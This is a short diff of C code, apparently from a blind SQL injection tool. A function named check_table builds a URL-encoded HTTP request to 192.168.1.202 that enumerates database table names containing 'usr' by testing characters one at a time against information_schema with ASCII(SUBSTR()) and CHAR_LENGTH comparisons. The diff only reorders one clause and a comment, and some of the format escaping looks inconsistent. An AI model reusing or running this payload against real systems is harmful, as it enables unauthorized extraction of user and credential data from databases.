@@ -236,8 +236,9 @@ bool check_table(const void *ctx) {
         "FROM%%20information_schema.TABLES%%20"
         "WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20"
         "AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20"
-        "AND%%20CHAR_LENGTH(table_name)<CHAR_LENGTH(%%27%s%%27%)%20"// %s = discovered (Literal)
+        // %s = discovered (Literal)
         "AND%%20ASCII(SUBSTR(table_name,%i,1))<%%3dASCII(%%27%s%%27)%%20"
+        "AND%%20CHAR_LENGTH(table_name)<CHAR_LENGTH(%%27%s%%27%)%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
